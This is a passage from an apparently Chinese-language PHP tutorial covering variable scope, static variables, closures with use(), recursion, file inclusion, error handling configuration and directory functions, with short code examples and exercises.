<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span>=<span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$num</span>;   <span class="comment">//将全局变量的$num的地址引入到函数内部  相当于$num=&amp;GLOBALS[&#x27;num&#x27;]</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$num</span>;	<span class="comment">//10		引用传递</span></span><br><span class="line">	<span class="variable">$num</span>=<span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;    <span class="comment">//100</span></span><br><span class="line">-----------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span>=<span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$num</span>;</span><br><span class="line">	<span class="keyword">unset</span>(<span class="variable">$num</span>);  <span class="comment">//销毁的是引用，不是具体的值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fun</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;    <span class="comment">//10  </span></span><br></pre></td></tr></table></figure>





<p>小结：</p>
<p>1、$GLOBALS保存的是全局变量的所有的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">20</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$GLOBALS</span>);   <span class="comment">//是一个数组，保存的是全局变量的所有的值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show</span>();</span><br></pre></td></tr></table></figure>

<p>2、global用于创建一个全局变量的引用</p>
<p>注意：常量没有作用域的概念</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">define(&#x27;PI&#x27;,3.14);</span></span><br><span class="line"><span class="comment">function fun() &#123;</span></span><br><span class="line"><span class="comment">	echo PI;   //3.14</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">fun();</span></span><br><span class="line"><span class="comment">echo &#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">-------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">define</span>(<span class="string">&#x27;PI&#x27;</span>,<span class="number">3.14</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>();</span><br><span class="line"><span class="keyword">echo</span> PI;   <span class="comment">//3.14</span></span><br></pre></td></tr></table></figure>



<h4 id="1-2-2-静态变量（static）"><a href="#1-2-2-静态变量（static）" class="headerlink" title="1.2.2  静态变量（static）"></a>1.2.2  静态变量（static）</h4><p>静态变量一般指的是静态局部变量。</p>
<p>静态变量只初始化一次，调用完毕吧不销毁，第二次调用的时候就不再初始化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$num</span>=<span class="number">10</span>;	<span class="comment">//普通变量每调用一次初始化一次，调用完毕销毁</span></span><br><span class="line">	<span class="variable">$num</span>++;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$num</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>();	<span class="comment">//11</span></span><br><span class="line"><span class="title function_ invoke__">fun</span>();	<span class="comment">//11</span></span><br><span class="line">--------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">static</span> <span class="variable">$num</span>=<span class="number">10</span>;	<span class="comment">//静态变量只初始化一次，调用完毕吧不销毁，第二次调用的时候就不再初始化</span></span><br><span class="line">	<span class="variable">$num</span>++;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$num</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun</span>();	<span class="comment">//11</span></span><br><span class="line"><span class="title function_ invoke__">fun</span>();	<span class="comment">//12</span></span><br></pre></td></tr></table></figure>





<p>常量和静态变量的区别</p>
<p>1、常量和静态变量都是初始化一次		define</p>
<p>2、常量不能改变值，静态变量可以改变值</p>
<p>3、常量没有作用域，静态变量有作用域</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">define</span>(<span class="string">&#x27;num&#x27;</span>,<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> num;   <span class="comment">//10</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun1</span>();</span><br><span class="line"><span class="title function_ invoke__">fun2</span>();</span><br><span class="line">------------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">static</span> <span class="variable">$num</span>=<span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$num</span>;  <span class="comment">//Notice: Undefined variable: num 因为静态变量是有作用域的</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fun1</span>();</span><br><span class="line"><span class="title function_ invoke__">fun2</span>();</span><br></pre></td></tr></table></figure>



<h4 id="1-2-3-匿名函数use"><a href="#1-2-3-匿名函数use" class="headerlink" title="1.2.3  匿名函数use()"></a>1.2.3  匿名函数use()</h4><p>默认情况下，函数内部不能访问函数外部的变量，</p>
<p>但在匿名函数中，可以通过use将外部变量引入匿名函数中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span>=<span class="number">10</span>;</span><br><span class="line"><span class="variable">$fun</span>=<span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$num</span></span>) </span>&#123;  <span class="comment">//将$num引入到匿名函数中</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$num</span>;	</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$fun</span>();   <span class="comment">//10</span></span><br></pre></td></tr></table></figure>



<p>思考：如何在函数内部访问函数外部变量</p>
<p>1、使用超全局变量 	$_GET&#x2F;$_POST</p>
<p>2、$GLOBALS			</p>
<p>3、global</p>
<p>4、use将函数外部变量引入到匿名函数内部</p>
<p>练习：代码输出什么</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span>=<span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$num</span>=<span class="number">20</span>;</span><br><span class="line">	<span class="variable">$fun</span>=<span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$num</span></span>) </span>&#123;   <span class="comment">//只能引入一层</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$num</span>;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="variable">$fun</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>();    <span class="comment">//20</span></span><br></pre></td></tr></table></figure>

<p>多学一招：use可以引入值，也可以引入地址</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span>=<span class="number">10</span>;</span><br><span class="line"><span class="variable">$fun</span>=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)<span class="keyword">use</span>(<span class="params">&amp;<span class="variable">$num</span></span>)</span>&#123;   <span class="comment">//use可以传地址</span></span><br><span class="line">	<span class="variable">$num</span>=<span class="number">100</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$fun</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;  <span class="comment">//100</span></span><br></pre></td></tr></table></figure>



<h2 id="1-3-递归"><a href="#1-3-递归" class="headerlink" title="1.3  递归"></a>1.3  递归</h2><p>函数内部自己调用自己</p>
<p>递归有两个元素，一个是递归点（从什么地方递归），第二递归出口</p>
<p>例题1：输出9 8 7 6 …..</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printer</span>(<span class="params"><span class="variable">$num</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$num</span>,<span class="string">&#x27;&amp;nbsp;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">1</span>)	<span class="comment">//递归出口</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="title function_ invoke__">printer</span>(<span class="variable">$num</span>-<span class="number">1</span>);	<span class="comment">//递归点</span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">printer</span>(<span class="number">9</span>);	<span class="comment">//9 8 7 6 5 4 3 2 1 </span></span><br></pre></td></tr></table></figure>



<p>例题2：从1加到100</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cal</span>(<span class="params"><span class="variable">$num</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$num</span>+<span class="title function_ invoke__">cal</span>(<span class="variable">$num</span>-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">cal</span>(<span class="number">100</span>);</span><br><span class="line"><span class="comment">//分析</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">第$i次执行			结果</span></span><br><span class="line"><span class="comment">cal(100)			100+cal(99)</span></span><br><span class="line"><span class="comment">=					100+99+cal(98)</span></span><br><span class="line"><span class="comment">=					100+99+98+cal(97)</span></span><br><span class="line"><span class="comment">=					100+99+98+++++cal(1)</span></span><br><span class="line"><span class="comment">=					100+99+98++++1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<p>小结：递归尽量少用，因为递归需要用到现场保护，现场保护是需要消耗资源的</p>
<h2 id="1-4-包含文件"><a href="#1-4-包含文件" class="headerlink" title="1.4  包含文件"></a>1.4  包含文件</h2><h4 id="1-4-1-包含文件的方式"><a href="#1-4-1-包含文件的方式" class="headerlink" title="1.4.1  包含文件的方式"></a>1.4.1  包含文件的方式</h4><p>1、require：包含多次</p>
<p>2、include：包含多次</p>
<p>3、require_once： 包含一次</p>
<p>4、include_once： 包含一次</p>
<p>小结：</p>
<p>1、require遇到错误抛出	error类别的错误，	<strong>停止执行</strong></p>
<p>2、include遇到错误抛出	warning类型的错误，<strong>继续执行</strong></p>
<p>3、require_once、include_once只能包含一次</p>
<p>4、HTML类型的包含页面中存在PHP代码，如果包含到PHP中是可以被执行的</p>
<p>5、包含文件相当于把包含文件中的代码拷贝到主文件中执行，但魔术常量除外，魔术常量获取的是所在文件的信息。</p>
<p>6、包含在编译时不执行、运行时加载到内存、独立编译包含文件</p>
<h4 id="1-4-2-包含文件的路径"><a href="#1-4-2-包含文件的路径" class="headerlink" title="1.4.2  包含文件的路径"></a>1.4.2  包含文件的路径</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./		当前目录</span><br><span class="line">../		上一级目录</span><br></pre></td></tr></table></figure>

<p>区分如下包含：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./head.html&#x27;</span>;   <span class="comment">//在当前目录下查找</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;head.html&#x27;</span>;	  <span class="comment">//受include_path配置影响</span></span><br></pre></td></tr></table></figure>

<p>include_path的使用场景：</p>
<p>如果包含文件的目录结构比较复杂，比如：在c:\aa\bb\cc\dd中有多个文件需要包含，可以将包含的路径设置成include_path，这样包含就只要写文件名就可以了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="string">&#x27;c:\aa\bb\cc\dd&#x27;</span>);  <span class="comment">//设置include_path</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;head1.html&#x27;</span>;	  <span class="comment">//受include_path配置影响</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;head2.html&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>include_path可以设置多个，路径之间用分号隔开</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="string">&#x27;c:\aa\bb\cc\dd;d:\\&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>多学一招：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">正斜（/） web中目录分隔用正斜  http://www.sina.com/index.php</span><br><span class="line">反斜（\）物理地址的分隔用反斜，（windows中物理地址正斜和反斜都可以）  c:\web1\aa</span><br></pre></td></tr></table></figure>



<h2 id="1-5-错误处理"><a href="#1-5-错误处理" class="headerlink" title="1.5  错误处理"></a>1.5  错误处理</h2><h4 id="1-5-1-错误的级别"><a href="#1-5-1-错误的级别" class="headerlink" title="1.5.1  错误的级别"></a>1.5.1  错误的级别</h4><ol>
<li>notice：提示		</li>
<li>warning：警告   &#x2F;include</li>
<li>error：致命错误   &#x2F;require</li>
</ol>
<p>notice和warning报错后继续执行，error报错后停止执行</p>
<h4 id="1-5-2-错误的提示方法"><a href="#1-5-2-错误的提示方法" class="headerlink" title="1.5.2  错误的提示方法"></a>1.5.2  错误的提示方法</h4><p>方法一：显示在浏览器上</p>
<p>方法二：记录在日志中</p>
<h4 id="1-5-3-与错误处理有关的配置"><a href="#1-5-3-与错误处理有关的配置" class="headerlink" title="1.5.3  与错误处理有关的配置"></a>1.5.3  与错误处理有关的配置</h4><p>在php.ini中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. error_reporting = E_ALL：报告所有的错误</span><br><span class="line">2. display_errors = On：将错误显示在浏览器上</span><br><span class="line">3. log_errors = On：将错误记录在日志中</span><br><span class="line">4. error_log=’地址’：错误日志保存的地址</span><br></pre></td></tr></table></figure>

<p>在项目开发过程中有两个模式，开发模式，运行模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开发模式：错误显示在浏览器上，不要记录在日志中</span><br><span class="line">运行模式：错误不显示在浏览器上，记录是日志中</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$debug</span>=<span class="literal">false</span>;		<span class="comment">//true:开发模式  false：运行模式</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;error_reporting&#x27;</span>,E_ALL);	<span class="comment">//所有的错误有报告</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$debug</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>,<span class="string">&#x27;on&#x27;</span>);	<span class="comment">//错误显示是浏览器上</span></span><br><span class="line">	<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;log_errors&#x27;</span>,<span class="string">&#x27;off&#x27;</span>);	<span class="comment">//错误不显示在日志中</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>,<span class="string">&#x27;off&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;log_errors&#x27;</span>,<span class="string">&#x27;on&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;error_log&#x27;</span>,<span class="string">&#x27;./err.log&#x27;</span>);	<span class="comment">//错误日志保存的地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;</span><br></pre></td></tr></table></figure>

<p>提示：ini_set()设置PHP的配置参数</p>
<h4 id="1-5-4-自定义错误处理-了解"><a href="#1-5-4-自定义错误处理-了解" class="headerlink" title="1.5.4  自定义错误处理(了解)"></a>1.5.4  自定义错误处理(了解)</h4><p>a.通过trigger_error产生一个用户级别的 error&#x2F;warning&#x2F;notice 信息</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$age</span>=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$age</span>&gt;<span class="number">80</span>)&#123;</span><br><span class="line">	<span class="comment">//trigger_error(&#x27;年龄不能超过80岁&#x27;);  //默认触发了notice级别的错误</span></span><br><span class="line">	<span class="comment">//trigger_error(&#x27;年龄不能超过80岁&#x27;,E_USER_NOTICE);	//触发notice级别的错误</span></span><br><span class="line">	<span class="comment">//trigger_error(&#x27;年龄不能超过80岁&#x27;,E_USER_WARNING);</span></span><br><span class="line">	<span class="title function_ invoke__">trigger_error</span>(<span class="string">&#x27;年龄不能超过80岁&#x27;</span>,E_USER_ERROR);   <span class="comment">//错误用户error错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：用户级别的错误的常量名中一定要带有USER。</p>
<p>b.定义错误处理函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;这是自定义错误处理&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(<span class="string">&#x27;error&#x27;</span>);	<span class="comment">//注册错误处理函数,只要有错误就会自动的调用错误处理函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;</span><br></pre></td></tr></table></figure>



<p>c.处理处理函数还可以带有参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*自定义错误处理函数</span></span><br><span class="line"><span class="comment">*<span class="doctag">@param</span> $errno int 错误类别</span></span><br><span class="line"><span class="comment">*<span class="doctag">@param</span> $errstr string 错误信息</span></span><br><span class="line"><span class="comment">*<span class="doctag">@param</span> $errfile string 文件地址</span></span><br><span class="line"><span class="comment">*<span class="doctag">@param</span> $errline int 错误行号</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error</span>(<span class="params"><span class="variable">$errno</span>,<span class="variable">$errstr</span>,<span class="variable">$errfile</span>,<span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">switch</span>(<span class="variable">$errno</span>)&#123;</span><br><span class="line">		<span class="keyword">case</span> E_NOTICE:</span><br><span class="line">		<span class="keyword">case</span> E_USER_NOTICE:</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;记录在日志中，上班后在处理&lt;br&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> E_WARNING:</span><br><span class="line">		<span class="keyword">case</span> E_USER_WARNING:	</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;给管理员发邮件&lt;br&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> E_ERROR:</span><br><span class="line">		<span class="keyword">case</span> E_USER_ERROR:</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;给管理员打电话&lt;br&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;错误信息：<span class="subst">&#123;$errstr&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;错误文件：<span class="subst">&#123;$errfile&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;错误行号：<span class="subst">&#123;$errline&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line">记录在日志中，上班后在处理</span><br><span class="line">错误信息：Undefined variable: num</span><br><span class="line">错误文件：F:\wamp\www\<span class="number">4</span>-demo.php</span><br><span class="line">错误行号：<span class="number">50</span></span><br></pre></td></tr></table></figure>



<h2 id="1-6-文件编程"><a href="#1-6-文件编程" class="headerlink" title="1.6  文件编程"></a>1.6  文件编程</h2><h4 id="1-6-1-文件夹操作"><a href="#1-6-1-文件夹操作" class="headerlink" title="1.6.1  文件夹操作"></a>1.6.1  文件夹操作</h4><p><strong>1 、</strong>创建文件夹【<code>mkdir(路径，权限，是否递归创建)</code>】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make:创建</span><br><span class="line">directory：目录，文件夹</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//1、创建目录</span></span><br><span class="line"><span class="comment">//mkdir(&#x27;./aa&#x27;);	//创建aa文件夹</span></span><br><span class="line"><span class="comment">//mkdir(&#x27;./aa/bb&#x27;);	//在aa目录下创建bb(aa目录必须存在)</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;./aa/bb/cc/dd&#x27;</span>,<span class="number">0777</span>,<span class="literal">true</span>);	<span class="comment">//递归创建</span></span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、0777表示是文件夹的权限，在Linux中有讲解</p>
<p>2、true表示递归创建，默认是false</p>
<p><strong>2、</strong>删除文件夹【rmdir()】</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//remove:移除</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">rmdir</span>(<span class="string">&#x27;./aa/bb/cc/dd&#x27;</span>);	<span class="comment">//删除dd文件夹</span></span><br></pre></td></tr></table></figure>

<p>提醒：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、删除的文件夹必须是空的</span><br><span class="line">2、PHP基于安全考虑，没有提供递归删除。</span><br></pre></td></tr></table></figure>



<p><strong>3、</strong>重命名文件夹【rename(旧名字，新名字)】</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&#x27;./aa&#x27;</span>,<span class="string">&#x27;./aaa&#x27;</span>);	<span class="comment">//将aa改为aaa</span></span><br></pre></td></tr></table></figure>



<p><strong>4、</strong>是否是文件夹【is_dir()】</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;./aaa&#x27;</span>)?<span class="string">&#x27;是文件夹&#x27;</span>:<span class="string">&#x27;不是文件夹&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p><strong>5、</strong>打开文件夹、读取文件夹、关闭文件夹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$folder</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;./&#x27;</span>);	<span class="comment">//打开目录</span></span><br><span class="line"><span class="comment">//var_dump($folder);		//resource(3) of type (stream) </span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$f</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$folder</span>))&#123;	<span class="comment">//读取文件夹</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$f</span>==<span class="string">&#x27;.&#x27;</span> || <span class="variable">$f</span>==<span class="string">&#x27;..&#x27;</span>)</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>,<span class="variable">$f</span>),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;  <span class="comment">//将gbk转成utf-8</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">closedir</span>(<span class="variable">$folder</span>);		<span class="comment">//关闭文件夹</span></span><br></pre></td></tr></table></figure>

<p>小结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、opendir()返回资源类型</span><br><span class="line">2、每个文件夹中都有.和..</span><br><span class="line">3、iconv()用来做字符编码转换</span><br></pre></td></tr></table></figure>



<h2 id="1-7-例题"><a href="#1-7-例题" class="headerlink" title="1.7  例题"></a>1.7  例题</h2><p>1、 通过for循环将数组中值求和、求平均值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//1、求数组的和、平均值</span><br><span class="line">$num=[1,20,53,23,14,12,15];</span><br><span class="line">$sum=0;</span><br><span class="line">for($i=0,$n=count($num);$i&lt;$n;$i++)&#123;</span><br><span class="line">	$sum+=$num[$i];</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;和是：&#x27;.$sum,&#x27;&lt;br&gt;&#x27;;		//和是：138</span><br><span class="line">echo &#x27;平均值：&#x27;.number_format($sum/count($num),1);   //精确到小数点后面1位  平均值：19.7</span><br><span class="line">echo &#x27;&lt;hr&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p>2、数组翻转</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stu</span>=[<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;berry&#x27;</span>,<span class="string">&#x27;ketty&#x27;</span>,<span class="string">&#x27;rose&#x27;</span>,<span class="string">&#x27;jake&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>,<span class="variable">$j</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$stu</span>)-<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="variable">$j</span>;<span class="variable">$i</span>++,<span class="variable">$j</span>--)&#123;</span><br><span class="line">	[<span class="variable">$stu</span>[<span class="variable">$i</span>],<span class="variable">$stu</span>[<span class="variable">$j</span>]]=[<span class="variable">$stu</span>[<span class="variable">$j</span>],<span class="variable">$stu</span>[<span class="variable">$i</span>]];   <span class="comment">//元素交换</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$stu</span>); <span class="comment">//Array ( [0] =&gt; jake [1] =&gt; rose [2] =&gt; ketty [3] =&gt; berry [4] =&gt; tom ) </span></span><br></pre></td></tr></table></figure>

<p>3、遍历二维数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stu</span>=[</span><br><span class="line">	[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],</span><br><span class="line">	[<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>]</span><br><span class="line">];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$stu</span>);<span class="variable">$i</span>++)&#123;	<span class="comment">//循环第一列</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$stu</span>[<span class="variable">$i</span>]);<span 